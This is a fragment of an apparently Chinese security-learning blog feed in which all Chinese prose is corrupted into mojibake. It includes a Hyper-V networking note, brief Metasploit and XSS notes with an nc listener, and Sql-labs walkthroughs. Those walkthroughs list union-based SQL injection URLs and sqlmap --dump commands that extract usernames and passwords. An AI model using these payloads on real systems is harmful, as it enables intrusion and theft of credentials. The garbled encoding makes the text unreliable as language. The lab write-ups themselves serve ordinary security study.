    <content type="html"><![CDATA[<h2 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h2><p>hypervåˆ›å»ºè™šæ‹Ÿæœºçš„æ—¶å€™ï¼Œé»˜è®¤ç”¨çš„æ˜¯default switchï¼Œè¿™ä¸ªdefault switchç”Ÿæˆçš„ipv4åœ°å€æ˜¯å˜åŒ–çš„</p><h2 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h2><p>æœ‰ä¸€ä¸ªä¸å˜çš„ipv4åœ°å€ï¼Œæ–¹ä¾¿sshè¿œç¨‹è¿æ¥</p><p>åŒæ—¶è¿˜å¯ä»¥è¿æ¥å¤–ç½‘</p><h2 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h2><h3 id="è™šæ‹Ÿæœºæ–°åŠ ç½‘ç»œé€‚é…å™¨"><a href="#è™šæ‹Ÿæœºæ–°åŠ ç½‘ç»œé€‚é…å™¨" class="headerlink" title="è™šæ‹Ÿæœºæ–°åŠ ç½‘ç»œé€‚é…å™¨"></a>è™šæ‹Ÿæœºæ–°åŠ ç½‘ç»œé€‚é…å™¨</h3><p>åœ¨hypervä¸­æ·»åŠ ä¸€å—å†…éƒ¨ç½‘å¡ï¼Œå–åä¸ºkali</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230813180608.png" alt="image.png"></p><p>åœ¨kaliçš„è™šæ‹Ÿæœºä¸­æ·»åŠ ä¸€ä¸ªç½‘ç»œé€‚é…å™¨ï¼Œä½¿ç”¨åˆšåˆšåˆ›å»ºçš„kali</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230813180523.png" alt="image.png"></p><h3 id="ä¸»æœºç½‘å¡é…ç½®"><a href="#ä¸»æœºç½‘å¡é…ç½®" class="headerlink" title="ä¸»æœºç½‘å¡é…ç½®"></a>ä¸»æœºç½‘å¡é…ç½®</h3><p>default switchä¸åšä»»ä½•æ›´æ”¹ï¼Œä½¿ç”¨é»˜è®¤é…ç½®ï¼Œå¦‚ä¸‹ï¼š<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230813180935.png" alt="image.png"></p><p>æ–°å»ºçš„å†…éƒ¨ç½‘å¡ï¼Œé…ç½®ä¸ºè‡ªå®šä¹‰çš„ä¸œè¥¿<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230813180854.png" alt="image.png"></p><h3 id="è™šæ‹Ÿæœºç½‘å¡é…ç½®"><a href="#è™šæ‹Ÿæœºç½‘å¡é…ç½®" class="headerlink" title="è™šæ‹Ÿæœºç½‘å¡é…ç½®"></a>è™šæ‹Ÿæœºç½‘å¡é…ç½®</h3><p>é…ç½®å‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootã‰¿kali)-[~]<br>â””â”€<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host<br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:15:5d:38:01:18 brd ff:ff:ff:ff:ff:ff<br>    inet 172.20.18.191/20 brd 172.20.31.255 scope global dynamic noprefixroute eth0<br>       valid_lft 66803sec preferred_lft 66803sec<br>    inet6 fe80::ab0d:697e:3a89:841/64 scope <span class="hljs-built_in">link</span> noprefixroute<br>       valid_lft forever preferred_lft forever<br>3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:15:5d:38:01:1a brd ff:ff:ff:ff:ff:ff<br>    inet6 fe80::dab4:f432:f0bf:3a14/64 scope <span class="hljs-built_in">link</span> noprefixroute<br>       valid_lft forever preferred_lft forever<br><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ç½‘å¡é…ç½®ï¼Œæ·»åŠ eth1ç›¸å…³é…ç½®ï¼Œå¹¶é‡å¯ç½‘ç»œç»„ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootã‰¿kali)-[~]<br>â””â”€<span class="hljs-comment"># cat /etc/network/interfaces</span><br><span class="hljs-comment"># This file describes the network interfaces available on your system</span><br><span class="hljs-comment"># and how to activate them. For more information, see interfaces(5).</span><br><br><span class="hljs-built_in">source</span> /etc/network/interfaces.d/*<br><br><span class="hljs-comment"># The loopback network interface</span><br>auto lo<br>iface lo inet loopback<br><br>auto eth1<br>iface eth1 inet static<br>address 192.168.20.202<br>netmask 255.255.255.0<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~]<br>â””â”€<span class="hljs-comment"># service networking restart</span><br><br><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°eth1ä¸‹é¢å·²ç»æœ‰äº†ipåœ°å€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootã‰¿kali)-[~]<br>â””â”€<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host<br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:15:5d:38:01:18 brd ff:ff:ff:ff:ff:ff<br>    inet 172.20.18.191/20 brd 172.20.31.255 scope global dynamic noprefixroute eth0<br>       valid_lft 66549sec preferred_lft 66549sec<br>    inet6 fe80::ab0d:697e:3a89:841/64 scope <span class="hljs-built_in">link</span> noprefixroute<br>       valid_lft forever preferred_lft forever<br>3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:15:5d:38:01:1a brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.20.202/24 brd 192.168.20.255 scope global eth1<br>       valid_lft forever preferred_lft forever<br><br><br></code></pre></td></tr></table></figure><p>çœ‹ä¸‹è·¯ç”±è¡¨ï¼Œæ­¤æ—¶é»˜è®¤è·¯ç”±æ˜¯ä»eth0ç½‘å¡èµ°çš„<br>ping ç™¾åº¦ä¹Ÿæ˜¯å¯ä»¥pingé€šçš„ è¯´æ˜ç½‘ç»œæ²¡æœ‰é—®é¢˜</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootã‰¿kali)-[~]<br>â””â”€<span class="hljs-comment"># route -n</span><br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>0.0.0.0         172.20.16.1     0.0.0.0         UG    101    0        0 eth0<br>172.20.16.0     0.0.0.0         255.255.240.0   U     101    0        0 eth0<br>192.168.20.0    0.0.0.0         255.255.255.0   U     0      0        0 eth1<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~]<br>â””â”€<span class="hljs-comment"># ping www.baidu.com</span><br>PING www.a.shifen.com (39.156.66.14) 56(84) bytes of data.<br>64 bytes from 39.156.66.14 (39.156.66.14): icmp_seq=1 ttl=51 time=6.01 ms<br>64 bytes from 39.156.66.14 (39.156.66.14): icmp_seq=2 ttl=51 time=5.59 ms<br>64 bytes from 39.156.66.14 (39.156.66.14): icmp_seq=3 ttl=51 time=5.67 ms<br>^C64 bytes from 39.156.66.14: icmp_seq=4 ttl=51 time=5.72 ms<br><br>--- www.a.shifen.com ping statistics ---<br>4 packets transmitted, 4 received, 0% packet loss, time 3082ms<br>rtt min/avg/max/mdev = 5.588/5.744/6.006/0.157 ms<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~]<br>â””â”€<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><p>é‡å¯è™šæ‹Ÿæœºåï¼Œæ·»åŠ çš„é™æ€ç½‘å¡ipåœ°å€æ˜¯ä¸å˜çš„ï¼ŒåŒæ ·å¯ä»¥æ ¹æ®è¿™ä¸ªipåœ°å€è¿›è¡Œè¿œç¨‹è¿æ¥ï¼Œå°±ä¸éœ€è¦æ¯æ¬¡éƒ½æ¢ipäº†~</p><h3 id="é—®é¢˜è¯´æ˜"><a href="#é—®é¢˜è¯´æ˜" class="headerlink" title="é—®é¢˜è¯´æ˜"></a>é—®é¢˜è¯´æ˜</h3><p>å¦‚æœè·¯ç”±è¡¨é‡Œé¢æœ‰ä¸¤æ¡é»˜è®¤è·¯ç”±ï¼Œæ­¤æ—¶pingç™¾åº¦pingä¸é€š<br>å¯ä»¥é€šè¿‡ä¿®æ”¹ç½‘å¡é…ç½®ï¼Œåˆ é™¤gatewayç›¸å…³å†…å®¹ï¼Œ å¹¶é‡å¯ç½‘ç»œæ¥è§£å†³</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(kaliã‰¿kali)-[~]<br>â””â”€$ route -n<br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>0.0.0.0         192.168.20.1    0.0.0.0         UG    0      0        0 eth1<br>0.0.0.0         172.20.16.1     0.0.0.0         UG    101    0        0 eth0<br>172.20.16.0     0.0.0.0         255.255.240.0   U     101    0        0 eth0<br>192.168.20.0    0.0.0.0         255.255.255.0   U     0      0        0 eth1<br><br><br><br>â”Œâ”€â”€(kaliã‰¿kali)-[~]<br>â””â”€$ ping www.baidu.com<br>PING www.a.shifen.com (39.156.66.18) 56(84) bytes of data.<br>From 192.168.20.202 (192.168.20.202) icmp_seq=1 Destination Host Unreachable<br>From 192.168.20.202 (192.168.20.202) icmp_seq=2 Destination Host Unreachable<br>From 192.168.20.202 (192.168.20.202) icmp_seq=3 Destination Host Unreachable<br>^C<br>--- www.a.shifen.com ping statistics ---<br>4 packets transmitted, 0 received, +3 errors, 100% packet loss, time 6153ms<br>pipe 4<br><br>â”Œâ”€â”€(kaliã‰¿kali)-[~]<br>â””â”€$<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfç³»åˆ—ã€‘metasploit</title>
    <link href="/2023/08/12/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91metasploit/"/>
    <url>/2023/08/12/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91metasploit/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230812211411.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230812211639.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">show exploits<br><br>info<br>back<br><br>search ms17<br>search <span class="hljs-built_in">type</span>:auxiliary name:ms17<br>search <span class="hljs-built_in">type</span>:exploit name:ms17<br>search <span class="hljs-built_in">type</span>:payload<br><br><span class="hljs-built_in">set</span> rhosts x.x.x.x<br></code></pre></td></tr></table></figure><p>445ç«¯å£<br>smbåè®®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">whois<br></code></pre></td></tr></table></figure><p>å¯†ç ç”Ÿæˆå™¨ï¼šgenpAss</p><p>phpmyadmin 4.8.1åå°getshell</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230812234818.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230812235037.png" alt="image.png"></p><p>msfconsole</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfç³»åˆ—ã€‘XSS</title>
    <link href="/2023/08/08/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91XSS/"/>
    <url>/2023/08/08/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91XSS/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808205604.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808211215.png" alt="image.png"></p><p>Burpsuiteï¼š<br>Encoder  å°†ä¸€ä¸ªurlå˜æˆurlçš„ç¼–ç æ–¹å¼<br>Render æ¸²æŸ“</p><p>window.location é‡å®šå‘</p><p>nc -vnlp 80 ç›‘å¬80ç«¯å£</p><h1 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup 2"></a>writeup 2</h1><p><a href="https://www.charseki.com/archives/xss-test-platform">XSS Test Platform</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfç³»åˆ—ã€‘å¸¸ç”¨æœ¯è¯­</title>
    <link href="/2023/08/08/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD/"/>
    <url>/2023/08/08/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD/</url>
    
    <content type="html"><![CDATA[<p>PoC<br>shellcode</p><p>exploitï¼šç”¨äºæ”»å‡»çš„è„šæœ¬ä¸æ–¹æ¡ˆ<br>payloadï¼šæ”»å‡»è½½è·ï¼Œæ˜¯çš„ç›®æ ‡è¿›ç¨‹è¢«åŠ«æŒæ§åˆ¶æµçš„æ•°æ®<br>shellcodeï¼šè°ƒç”¨æ”»å‡»ç›®æ ‡çš„shellçš„ä»£ç </p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfç³»åˆ—ã€‘Sql-labs ç¬¬02å…³ï¼šGET -Error based -Integer based</title>
    <link href="/2023/08/08/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91Sql-labs%20%E7%AC%AC02%E5%85%B3%EF%BC%9AGET%20-Error%20based%20-Integer%20based/"/>
    <url>/2023/08/08/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91Sql-labs%20%E7%AC%AC02%E5%85%B3%EF%BC%9AGET%20-Error%20based%20-Integer%20based/</url>
    
    <content type="html"><![CDATA[<h1 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h1><h2 id="æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥"><a href="#æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥" class="headerlink" title="æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥"></a>æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">2</span><br><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">2</span><br><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> order by <span class="hljs-number">1</span> <br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> order by <span class="hljs-number">3</span> <br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=<span class="hljs-number">1</span> order by <span class="hljs-number">4</span><br><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database()<br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables<br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="hljs-string">&#x27;security&#x27;</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) from information_schema.columns where table_schema=<span class="hljs-string">&#x27;security&#x27;</span> and table_name=<span class="hljs-string">&#x27;users&#x27;</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,<span class="hljs-number">0</span>x3a,password) from users<br><br></code></pre></td></tr></table></figure><h2 id="æ–¹æ³•2ï¼šsqlmapå·¥å…·-åŒç¬¬01å…³"><a href="#æ–¹æ³•2ï¼šsqlmapå·¥å…·-åŒç¬¬01å…³" class="headerlink" title="æ–¹æ³•2ï¼šsqlmapå·¥å…· åŒç¬¬01å…³"></a>æ–¹æ³•2ï¼šsqlmapå·¥å…· åŒç¬¬01å…³</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 --dbs<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security --tables<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> --columns<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> -C password,<span class="hljs-built_in">id</span>,username --dump<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€kaliã€‘kaliä¸­å®‰è£…w3af</title>
    <link href="/2023/08/08/ctf/%E3%80%90kali%E3%80%91kali%E4%B8%AD%E5%AE%89%E8%A3%85w3af/"/>
    <url>/2023/08/08/ctf/%E3%80%90kali%E3%80%91kali%E4%B8%AD%E5%AE%89%E8%A3%85w3af/</url>
    
    <content type="html"><![CDATA[<p>å°†é»˜è®¤çš„pythonæŒ‡å‘python2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py<br>python get-pip.py<br><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>å®‰è£…pipï¼š<a href="https://stackoverflow.com/questions/64187581/e-package-python-pip-has-no-installation-candidate">https://stackoverflow.com/questions/64187581/e-package-python-pip-has-no-installation-candidate</a><br>ä¿®æ”¹é»˜è®¤pythonï¼š<a href="https://blog.csdn.net/Romance5201314/article/details/81667778">https://blog.csdn.net/Romance5201314/article/details/81667778</a>   </p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€kaliã€‘kaliä¸­å®‰è£…w3af</title>
    <link href="/2023/08/08/ctf/unsupported/%E3%80%90kali%E3%80%91kali%E4%B8%AD%E5%AE%89%E8%A3%85w3af/"/>
    <url>/2023/08/08/ctf/unsupported/%E3%80%90kali%E3%80%91kali%E4%B8%AD%E5%AE%89%E8%A3%85w3af/</url>
    
    <content type="html"><![CDATA[<p>å°†é»˜è®¤çš„pythonæŒ‡å‘python2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py<br>python get-pip.py<br><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>å®‰è£…pipï¼š<a href="https://stackoverflow.com/questions/64187581/e-package-python-pip-has-no-installation-candidate">https://stackoverflow.com/questions/64187581/e-package-python-pip-has-no-installation-candidate</a><br>ä¿®æ”¹é»˜è®¤pythonï¼š<a href="https://blog.csdn.net/Romance5201314/article/details/81667778">https://blog.csdn.net/Romance5201314/article/details/81667778</a>   </p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfç³»åˆ—ã€‘Sql-labs ç¬¬01å…³ï¼šGET -Error based -Single quotes -String</title>
    <link href="/2023/08/08/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91Sql-labs%20%E7%AC%AC01%E5%85%B3%EF%BC%9AGET%20-Error%20based%20-Single%20quotes%20-String/"/>
    <url>/2023/08/08/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91Sql-labs%20%E7%AC%AC01%E5%85%B3%EF%BC%9AGET%20-Error%20based%20-Single%20quotes%20-String/</url>
    
    <content type="html"><![CDATA[<h1 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h1><h2 id="æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥"><a href="#æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥" class="headerlink" title="æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥"></a>æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">2</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">3</span><br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">2</span><br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27;<br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; --<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; --+<br><br><span class="hljs-comment"># ç¡®å®šè¡¨ä¸­çš„åˆ—æ•°</span><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">1</span> --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">3</span> --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&#x27; order by <span class="hljs-number">4</span> --+<br><br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() --+<br><span class="hljs-attribute">http</span>://x.x.x.x:x/Less-<span 